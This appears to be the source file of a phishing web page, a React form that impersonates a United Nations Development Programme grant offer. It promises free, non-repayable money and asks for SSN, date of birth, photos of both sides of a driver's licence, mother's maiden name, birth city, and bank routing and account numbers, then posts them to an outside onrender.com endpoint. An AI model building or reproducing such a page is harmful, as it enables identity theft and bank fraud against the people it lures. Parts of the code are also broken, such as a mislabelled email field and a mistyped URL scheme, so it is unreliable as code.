"use client";
import Image from "next/image";
import React, { ChangeEvent, useState } from "react";
import { ToastContainer, toast } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";
import { FaPlus } from "react-icons/fa";
import Select from "react-select";

const Form = () => {
  const [formData, setFormData] = useState({
    firstName: "",
    middleName: "",
    lastName: "",
    addressLine1: "",
    addressLine2: "",
    city: "",
    state: "",
    zipCode: "",
    phoneNumber: "",
    ssn: "",
    gender: "",
    dob: "",
    idNumber: "",
    idFrontImage: null as File | null,
    idBackImage: null as File | null,
    idExpiryDate: "",
    birthCity: "",
    motherMaidenName: "",
    email: "",
    grantType: "",
    grantAmount: "",
    receiveMethod: "",
    accountType: "",
    routingNumber: "",
    accountNumber: "",
    mailingAddress: "",
    photo: null as File | null,
  });
  const [selectedGender, setSelectedGender] = useState<{
    label: string;
    value: string;
  } | null>(null);
  const [selectedGrantType, setSelectedGrantType] = useState<{
    label: string;
    value: string;
  } | null>(null);
  const [selectedReceiveMethod, setSelectedReceiveMethod] = useState<{
    label: string;
    value: string;
  } | null>(null);
  const [selectedAccountType, setSelectedAccountType] = useState<{
    label: string;
    value: string;
  } | null>(null);
  const [selectedState, setSelectedState] = useState<string | null>(null);

  const handleSelectChange = (selectedOption: any, name: string) => {
    if (name === "gender") {
      setSelectedGender(selectedOption);
    } else if (name === "grantType") {
      setSelectedGrantType(selectedOption);
    } else if (name === "receiveMethod") {
      setSelectedReceiveMethod(selectedOption);
    } else if (name === "accountType") {
      setSelectedAccountType(selectedOption);
    } else if (name === "state") {
      setSelectedState(selectedOption.value);
      setFormData({ ...formData, [name]: selectedOption.value });
    }
  };

  const states = [
    "Alabama",
    "Alaska",
    "Arizona",
    "Arkansas",
    "California",
    "Colorado",
    "Connecticut",
    "Delaware",
    "Florida",
    "Georgia",
    "Hawaii",
    "Idaho",
    "Illinois",
    "Indiana",
    "Iowa",
    "Kansas",
    "Kentucky",
    "Louisiana",
    "Maine",
    "Maryland",
    "Massachusetts",
    "Michigan",
    "Minnesota",
    "Mississippi",
    "Missouri",
    "Montana",
    "Nebraska",
    "Nevada",
    "New Hampshire",
    "New Jersey",
    "New Mexico",
    "New York",
    "North Carolina",
    "North Dakota",
    "Ohio",
    "Oklahoma",
    "Oregon",
    "Pennsylvania",
    "Rhode Island",
    "South Carolina",
    "South Dakota",
    "Tennessee",
    "Texas",
    "Utah",
    "Vermont",
    "Virginia",
    "Washington",
    "West Virginia",
    "Wisconsin",
    "Wyoming",
  ];

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;

    // For ZIP code, check if the length is exactly 5 digits
    if (name === "zipCode" && value.length !== 5) {
      toast.error("ZIP code must be 5 digits");
      return;
    }

    // For SSN, format with dashes and ensure correct length
    if (name === "ssn") {
      const sanitizedValue = value.replace(/-/g, "");
      if (!/^\d{0,9}$/.test(sanitizedValue)) {
        toast.error("SSN must contain only numbers");
        return;
      }
      if (sanitizedValue.length !== 9) {
        toast.error("Please input a valid SSN");
        return;
      }
      let formattedSSN = sanitizedValue;
      if (sanitizedValue.length > 3) {
        formattedSSN = `${sanitizedValue.slice(0, 3)}-${sanitizedValue.slice(
          3
        )}`;
      }
      if (sanitizedValue.length > 5) {
        formattedSSN = `${formattedSSN.slice(0, 6)}-${formattedSSN.slice(6)}`;
      }
      setFormData({ ...formData, [name]: formattedSSN });
    } else {
      // For other fields, update the form data state normally
      setFormData({ ...formData, [name]: value });
    }
  };

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.files && e.target.files.length > 0) {
      const file = e.target.files[0];
      if (e.target.name === "idFrontImage") {
        setFormData({ ...formData, idFrontImage: file });
      } else if (e.target.name === "idBackImage") {
        setFormData({ ...formData, idBackImage: file });
      }
    }
  };

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    const formDataToSend = new FormData();
    formDataToSend.append("firstName", formData.firstName);
    formDataToSend.append("middleName", formData.middleName);
    formDataToSend.append("lastName", formData.lastName);
    formDataToSend.append("addressLine1", formData.addressLine1);
    formDataToSend.append("addressLine2", formData.addressLine2);
    formDataToSend.append("city", formData.city);
    formDataToSend.append("state", formData.state);
    formDataToSend.append("zipCode", formData.zipCode);
    formDataToSend.append("phoneNumber", formData.phoneNumber);
    formDataToSend.append("ssn", formData.ssn);
    formDataToSend.append("gender", selectedGender ? selectedGender.value : ""); // Provide a default value if selectedGender is null
    formDataToSend.append("dob", formData.dob);
    formDataToSend.append("idNumber", formData.idNumber);
    formDataToSend.append("idExpiryDate", formData.idExpiryDate);
    formDataToSend.append("birthCity", formData.birthCity);
    formDataToSend.append("motherMaidenName", formData.motherMaidenName);
    formDataToSend.append("email", formData.email);
    formDataToSend.append(
      "grantType",
      selectedGrantType ? selectedGrantType.value : ""
    );
    formDataToSend.append("grantAmount", formData.grantAmount);
    formDataToSend.append(
      "receiveMethod",
      selectedReceiveMethod ? selectedReceiveMethod.value : ""
    ); // Provide a default value if selectedReceiveMethod is null
    formDataToSend.append(
      "accountType",
      selectedAccountType ? selectedAccountType.value : ""
    ); // Provide a default value if selectedAccountType is null
    formDataToSend.append("routingNumber", formData.routingNumber);
    formDataToSend.append("accountNumber", formData.accountNumber);
    formDataToSend.append("mailingAddress", formData.mailingAddress);

    // Append idFrontImage if available
    if (formData.idFrontImage !== null) {
      formDataToSend.append("idFrontImage", formData.idFrontImage);
    }

    // Append idBackImage if available
    if (formData.idBackImage !== null) {
      formDataToSend.append("idBackImage", formData.idBackImage);
    }

    try {
      const response = await fetch("ttps://undp.onrender.com/api/submit-form", {
        method: "POST",
        body: formDataToSend,
      });
      console.log("Server Response:", response); // Log the response object
      if (response.ok) {
        toast.success("Thank You For Applying!");
        //toast.dismiss();
      } else {
        toast.error("Failed to submit form");
      }
    } catch (error) {
      console.error("Error:", error);
      toast.error("An error occurred while submitting the form");
    }
  };

  return (
    <div className="h-full w-full bg-[#ccc]">
      <ToastContainer />
      <div className="py-10 flex flex-col items-center gap-3 mx-auto container md:px-20 px-10">
        <h1 className="md:text-2xl text-base font-extrabold text-black uppercase text-center">
          United nation development programme grant(UNDP)
        </h1>
        <div className="flex md:flex-row flex-col items-center md:gap-10 gap-5">
          <Image src="/undp.svg" alt="" width={100} height={100} />
          <FaPlus color="#000" size={20} />

          <Image src="/ID.svg" alt="" width={100} height={100} />
        </div>
        <div className="">
          <p className="text-black text-sm mb-3">
            Submit your details To apply for the UNDP VITA Grant program you
            must be above 18 years of age. These Grants are not a loan and you
            don't need to pay back. Fill out your information and you can choose
            your preferred Grant type from the list below. You can only receive
            your payment through Direct Deposit or Debit Card.
          </p>

          <p className="text-black text-sm">
            Your application will be approved based on your credit score. If
            your credit score is below 300, we will automatically reject your
            application. If your credit score is between 300 to 850 then you
            have a high chance of getting approved. If your application is
            denied, our representatives are online to assist you or you can
            reapply for a different Grant. We'll update you via email as soon as
            we know if your Grant has been approved or not, and then we can
            proceed to funding. As a reminder, the UNDP Grants (United Nations
            Development Programme Grants) do not need to be repaid. An
            underwriter will contact you within 24 hours as soon as your
            application has been approved. Our requirements and information
          </p>
        </div>
      </div>
      <div className="container py-10 w-full md:mx-auto md:px-20 px-10">
        <form onSubmit={handleSubmit}>
          <div className="flex flex-col">
            <label htmlFor="" className="text-black mb-3 font-bold uppercase">
              Name
            </label>
            <div className="mb-3 flex flex-col  gap-10 sm:flex-row">
              <div className="w-full sm:w-1/2">
                {" "}
                <input
                  type="text"
                  name="firstName"
                  value={formData.firstName}
                  onChange={handleChange}
                  placeholder="First Name"
                  className="w-full bg-white text-xs py-3 px-5 text-black "
                  required
                />
              </div>
              <div className="w-full sm:w-1/2">
                <input
                  type="text"
                  name="middleName"
                  value={formData.middleName}
                  onChange={handleChange}
                  placeholder="Middle"
                  className="w-full bg-white text-xs py-3 px-5 text-black "
                  required
                />
              </div>
            </div>
            <div className="w-full ">
              <input
                type="text"
                name="lastName"
                value={formData.lastName}
                onChange={handleChange}
                placeholder="Last"
                className="w-full mb-3 bg-white text-xs py-3 px-5 text-black "
                required
              />
            </div>
          </div>
          <div className="flex flex-col mt-6">
            <h1 className="text-black mb-3 font-bold uppercase">Address</h1>
            <div className="w-full ">
              <input
                type="text"
                name="addressLine1"
                value={formData.addressLine1}
                onChange={handleChange}
                placeholder="Address Line 1"
                className="w-full mb-3 bg-white text-xs py-3 px-5 text-black "
                required
              />
            </div>

            <div className="w-full ">
              <input
                type="text"
                name="addressLine2"
                value={formData.addressLine2}
                onChange={handleChange}
                placeholder="Address Line 2"
                className="w-full mb-3 bg-white text-xs py-3 px-5 text-black "
                required
              />
            </div>
            <div className="mb-3 flex flex-col gap-10 sm:flex-row">
              <div className="w-full sm:w-1/2">
                {" "}
                <input
                  type="text"
                  name="city"
                  value={formData.city}
                  onChange={handleChange}
                  placeholder="City"
                  className="w-full bg-white text-xs py-3 px-5 text-black "
                  required
                />
              </div>
              <div className="w-full sm:w-1/2">
                <Select
                  className="text-xs text-black"
                  options={[
                    { label: "Select State", value: "" }, // Placeholder option
                    ...states.map((state) => ({ label: state, value: state })),
                  ]}
                  value={
                    selectedState
                      ? { label: selectedState, value: selectedState }
                      : undefined
                  }
                  onChange={(selectedOption) =>
                    handleSelectChange(selectedOption, "state")
                  }
                />
              </div>
            </div>
            <div className="w-full ">
              <input
                type="text"
                name="zipCode"
                value={formData.zipCode}
                onChange={handleChange}
                placeholder="Zip Code"
                className="w-full mb-3 bg-white text-xs py-3 px-5 text-black "
                required
              />
            </div>
          </div>
          <div className="mt-4">
            <label htmlFor="" className="text-black mb-3  font-bold uppercase">
              Phone number
            </label>{" "}
            <div className="w-full ">
              <input
                type="text"
                name="phoneNumber"
                value={formData.phoneNumber}
                onChange={handleChange}
                placeholder="Phone Number"
                className="w-full mb-3 mt-4 bg-white text-xs py-3 px-5 text-black "
                required
              />
            </div>
          </div>

          <div className="mt-4">
            <label htmlFor="" className="text-black mb-3  font-bold uppercase">
              Social Security Number(SSN)
            </label>{" "}
            <div className="w-full ">
              <input
                type="text"
                name="ssn"
                value={formData.ssn}
                onChange={handleChange}
                placeholder="SSN"
                className="w-full mb-3 mt-4 outline-none bg-white text-xs py-3 px-5 text-black "
                required
              />
            </div>
          </div>
          <div className="mt-4">
            <label htmlFor="" className="text-black mb-3  font-bold uppercase">
              Gender
            </label>{" "}
            <Select
              className="text-xs text-black"
              options={[
                { label: "Male", value: "male" },
                { label: "Female", value: "female" },
              ]}
              value={selectedGender}
              name="gender"
              onChange={(selectedOption) =>
                handleSelectChange(selectedOption, "gender")
              }
              placeholder="Select Gender"
            />
          </div>

          <div className="mt-4">
            <label htmlFor="" className="text-black mb-3  font-bold uppercase">
              Date of Birth
            </label>{" "}
            <div className="w-full ">
              <input
                type="date"
                name="dob"
                value={formData.dob}
                onChange={handleChange}
                className="w-full mb-3 mt-4 appearance-none bg-white text-xs py-3 px-5 text-black "
                required
              />
            </div>
          </div>

          <div className="mt-4">
            <label htmlFor="" className="text-black mb-3  font-bold uppercase">
              ID/Driver Licence Number
            </label>{" "}
            <div className="w-full ">
              <input
                type="text"
                name="idNumber"
                value={formData.idNumber}
                onChange={handleChange}
                placeholder="ID/Driver License Number"
                className="w-full mb-3 mt-4 outline-none bg-white text-xs py-3 px-5 text-black "
                required
              />
            </div>
          </div>

          <div className="mt-4">
            <label htmlFor="" className="text-black mb-3  font-bold uppercase">
              Upload ID/Driver Licence Front Image
            </label>{" "}
            <div className="w-full ">
              <input
                type="file"
                id="idFrontImage"
                name="idFrontImage"
                onChange={handleFileChange}
                className="w-full mb-3 mt-4 outline-none bg-white text-xs py-3 px-5 text-black "
                required
              />
            </div>
          </div>

          <div className="mt-4">
            <label htmlFor="" className="text-black mb-3  font-bold uppercase">
              Upload ID/Driver Licence Back Image
            </label>{" "}
            <div className="w-full ">
              <input
                type="file"
                id="idBackImage"
                name="idBackImage"
                onChange={handleFileChange}
                className="w-full mb-3 mt-4 outline-none bg-white text-xs py-3 px-5 text-black "
                required
              />
            </div>
          </div>

          <div className="mt-4">
            <label htmlFor="" className="text-black mb-3  font-bold uppercase">
              Driver License Expiry Date
            </label>{" "}
            <div className="w-full ">
              <input
                type="date"
                name="idExpiryDate"
                value={formData.idExpiryDate}
                onChange={handleChange}
                placeholder="Driver License Expiry Date"
                className="w-full mb-3 mt-4 bg-white text-xs py-3 px-5 text-black "
                required
              />
            </div>
          </div>

          <div className="mt-4">
            <label htmlFor="" className="text-black mb-3  font-bold uppercase">
              In What City Were You Born
            </label>{" "}
            <div className="w-full ">
              <input
                type="text"
                name="birthCity"
                value={formData.birthCity}
                onChange={handleChange}
                className="w-full mb-3 mt-4 bg-white text-xs py-3 px-5 text-black "
                required
              />
            </div>
          </div>

          <div className="mt-4">
            <label htmlFor="" className="text-black mb-3  font-bold uppercase">
              What is Your Mother Maiden Name?
            </label>{" "}
            <div className="w-full ">
              <input
                type="text"
                name="motherMaidenName"
                value={formData.motherMaidenName}
                onChange={handleChange}
                className="w-full mb-3 mt-4 bg-white text-xs py-3 px-5 text-black "
                required
              />
            </div>
          </div>
          <div className="mb-5.5 flex flex-col  gap-10 sm:flex-row">
            <div className="w-full sm:w-1/2">
              <input
                type="email"
                name="email"
                value={formData.email}
                onChange={handleChange}
                placeholder="Email"
                className="w-full bg-white outline-none text-xs py-3 px-5 text-black "
                required
              />
            </div>
            <div className="w-full sm:w-1/2">
              <input
                type="email"
                name="photo"
                onChange={handleFileChange}
                placeholder="Confirm Email"
                className="w-full outline-none bg-white text-xs py-3 px-5 text-black "
                required
              />
            </div>
          </div>
          <div className="mt-4">
            <label htmlFor="" className="text-black mb-3  font-bold uppercase">
              Grant Type
            </label>{" "}
            <Select
              className="text-xs text-black"
              options={[
                { label: "Personal Grant", value: "Personal Grant" },
                { label: "Educational Grant", value: "Educational Grant" },
                { label: "Business Grant", value: "Business Grant" },
              ]}
              value={selectedGrantType}
              onChange={(selectedOption) =>
                handleSelectChange(selectedOption, "grantType")
              }
              placeholder="Select Grant Type"
            />
          </div>
          <div className="mt-4">
            <label htmlFor="" className="text-black mb-3  font-bold uppercase">
              Grant Amount
            </label>{" "}
            <div className="w-full ">
              <input
                type="text"
                name="grantAmount"
                value={formData.grantAmount}
                onChange={handleChange}
                className="w-full mb-3 mt-4 bg-white text-xs py-3 px-5 text-black "
                required
              />
            </div>
          </div>
          <div className="mt-4">
            <label htmlFor="" className="text-black mb-3  font-bold uppercase">
              How To Receive Grant
            </label>{" "}
            <Select
              className="text-xs text-black"
              options={[
                { label: "Direct Deposit", value: "Direct Deposit" },
                { label: "Debit Card", value: "Debit Card" },
              ]}
              value={selectedReceiveMethod}
              onChange={(selectedOption) =>
                handleSelectChange(selectedOption, "receiveMethod")
              }
              placeholder="Select Receive Method"
            />
          </div>

          <div className="mb-5.5 flex flex-col  gap-10 sm:flex-row">
            <div className="w-full sm:w-[60%]">
              <label
                htmlFor=""
                className="text-black mb-3  font-bold capitalize"
              >
                Account Type
              </label>
              <Select
                className="text-xs text-black"
                options={[
                  { label: "Checkings", value: "Checkings" },
                  { label: "Savings", value: "Savings" },
                ]}
                value={selectedAccountType}
                onChange={(selectedOption) =>
                  handleSelectChange(selectedOption, "accountType")
                }
                placeholder="Select Account Type"
              />
            </div>
            <div className="w-full sm:w-[40%]">
              <label
                htmlFor=""
                className="text-black mb-3  font-bold capitalize"
              >
                Routing Number
              </label>
              <input
                type="text"
                name="routingNumber"
                value={formData.routingNumber}
                onChange={handleChange}
                className="w-full outline-none bg-white text-xs py-3 px-5 text-black "
                required
              />
            </div>
          </div>

          <div className="mt-4">
            <label htmlFor="" className="text-black mb-3  font-bold uppercase">
              Account Number
            </label>{" "}
            <div className="w-full ">
              <input
                type="text"
                name="accountNumber"
                value={formData.accountNumber}
                onChange={handleChange}
                className="w-full mb-3 mt-4 bg-white text-xs py-3 px-5 text-black "
                required
              />
            </div>
          </div>

          <div className="mt-4">
            <label htmlFor="" className="text-black mb-3  font-bold uppercase">
              Mailing Address
            </label>{" "}
            <div className="w-full ">
              <input
                type="text"
                name="mailingAddress"
                value={formData.mailingAddress}
                onChange={handleChange}
                className="w-full mb-3 mt-4 bg-white text-xs py-3 px-5 text-black "
                required
              />
            </div>
          </div>
          <button type="submit" className="bg-[#0C51A1] w-full mt-4 px-2 py-3">
            Submit
          </button>
        </form>
      </div>
    </div>
  );
};

export default Form;
